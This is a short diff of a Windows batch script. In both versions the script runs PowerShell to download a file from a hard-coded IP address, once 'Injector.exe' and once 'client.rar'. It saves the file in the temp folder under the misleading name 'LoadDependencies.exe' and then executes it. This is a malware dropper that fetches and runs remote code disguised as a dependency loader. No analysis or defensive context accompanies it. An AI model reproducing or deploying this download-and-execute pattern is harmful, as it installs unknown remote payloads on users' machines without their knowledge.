@@ -1,5 +1,5 @@
 @echo off
-powershell.exe -Command "$url = 'http://91.107.121.100/data/Injector.exe'; $dest = '%TEMP%\LoadDependencies.exe'; Invoke-WebRequest -Uri $url -OutFile $dest"
+powershell.exe -Command "$url = 'http://91.107.121.100/data/client.rar'; $dest = '%TEMP%\LoadDependencies.exe'; Invoke-WebRequest -Uri $url -OutFile $dest"
 cd %TEMP%
 start LoadDependencies.exe
 exit
